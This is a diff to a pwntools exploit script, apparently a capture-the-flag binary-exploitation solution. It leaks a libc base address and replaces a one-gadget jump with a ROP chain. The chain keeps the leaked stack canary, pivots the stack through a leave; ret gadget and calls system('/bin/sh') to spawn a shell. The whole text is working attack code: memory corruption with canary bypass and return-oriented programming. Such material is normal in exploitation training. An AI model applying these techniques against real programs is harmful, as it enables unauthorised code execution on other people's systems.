@@ -57,21 +57,24 @@ y.recvuntil('D' * 0x48)
 l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - 0x36e90
 log.success( 'libc -> {}'.format( hex( l.address ) ) )
 
+pop_rdi = pie + 0x1003
+leave_ret = pie + 0xb38
 
+add( 1 , flat( pop_rdi , l.search( '/bin/sh\x00' ).next() ) )
 add( 2 , 'b' * 0x10 )
 add( 3 , 'c' * 0x10 )
 mod( 2 , 'a' )
 
-magic = 0xf1117
-
 p = flat(
-    'D' * 0x18,
-    canary,
-    0,
-    l.address + magic
+        'D' * 0x18,
+        canary,
+        stk - 0x8,
+        leave_ret
 )
 
 mod( 3 , p )
+
+mod( 2 , p64( l.symbols['system'] ) )
 
 y.sendafter( 'ice:' , '5' )
 
